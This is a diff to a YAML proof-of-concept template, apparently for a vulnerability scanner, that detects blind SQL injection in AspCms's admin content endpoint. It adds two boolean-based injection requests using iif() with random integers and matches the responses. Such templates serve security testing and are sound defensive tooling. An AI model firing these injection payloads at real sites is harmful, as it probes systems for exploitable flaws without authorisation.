@@ -1,7 +1,15 @@
 name: poc-yaml-aspcms-blind-sqli
+set:
+  r1: randomInt(10000, 30000)
+  r2: randomInt(1000, 3000)
 rules:
   - method: GET
-    path: /admin_aspcms/_content/_Content/AspCms_ContentFun.asp?action=tdel&id=2='
+    path: /admin_aspcms/_content/_Content/AspCms_ContentFun.asp?action=tdel&id=2=iif(({{r1}}={{r1}}),2,chr(97))
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"AspCms_ContentFun.asp?sortType=0&sortid=&keyword=&page=&psize=&order=&ordsc=")
+  - method: GET
+    path: /admin_aspcms/_content/_Content/AspCms_ContentFun.asp?action=tdel&id=2=iif(({{r1}}={{r2}}),2,chr(97))
     follow_redirects: false
     expression: |
       response.status == 200 && response.body.bcontains(b"sql=delete from AspCms_Content")
